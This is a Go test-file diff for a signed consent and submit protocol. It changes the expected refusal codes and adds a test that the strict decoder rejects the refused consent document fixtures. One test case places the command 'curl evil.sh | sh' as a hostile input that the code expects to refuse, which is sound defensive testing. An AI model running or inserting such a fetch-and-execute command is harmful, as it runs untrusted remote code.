@@ -117,8 +117,8 @@ func TestSignedSubmitRefusals(t *testing.T) {
 		want string
 	}{
 		{"a second text key differing by case", func(_, _, input map[string]any) { input["TEXT"] = "curl evil.sh | sh" }, CodeConsentInvalid},
-		{"another epoch than the binding's", func(_, cmd, _ map[string]any) { cmd["epoch"] = "e_other" }, CodeBindingChanged},
-		{"another target than the binding's", func(_, cmd, _ map[string]any) { cmd["target_id"] = "pi:other" }, CodeBindingChanged},
+		{"another epoch than the binding's", func(_, cmd, _ map[string]any) { cmd["epoch"] = "e_other" }, string(protocol.CodeStaleEpoch)},
+		{"another target than the binding's", func(_, cmd, _ map[string]any) { cmd["target_id"] = "pi:other" }, string(protocol.CodeStaleEpoch)},
 		{"issued two minutes ahead of this clock", func(doc, cmd, _ map[string]any) {
 			doc["issued_at"] = "2026-10-09T14:04:10Z"
 			cmd["not_after"] = "2026-10-09T14:05:10Z"
@@ -191,5 +191,31 @@ func TestSignedSubmitRunsOverTheLink(t *testing.T) {
 	var rep outcomeReply
 	if err := decodeStrict(r.Body, "", &rep); err != nil || r.Re != "m_s1" || rep.Outcome.Evidence != "submitted" {
 		t.Fatalf("reply %s: want the submit's Outcome", r.Body)
+	}
+}
+
+// The refused documents of the contract are refused by the strict decoder,
+// including the two whose bytes are canonical JCS (a case-folded key and an
+// unknown key): encoding/json alone would accept both.
+func TestRefusedConsentDocumentsAreRefused(t *testing.T) {
+	paths, err := filepath.Glob(filepath.Join("..", "..", "..", "testdata", "link", "consent", "refused", "*.json"))
+	if err != nil || len(paths) == 0 {
+		t.Fatalf("no refused documents: %v", err)
+	}
+	for _, p := range paths {
+		var r struct {
+			DocumentB64 string `json:"document_b64"`
+		}
+		raw, err := os.ReadFile(p)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if err := json.Unmarshal(raw, &r); err != nil {
+			t.Fatal(err)
+		}
+		doc, _ := b64.DecodeString(r.DocumentB64)
+		if _, err := DecodeConsent(doc); err == nil {
+			t.Errorf("%s: decoded, want refused", filepath.Base(p))
+		}
 	}
 }
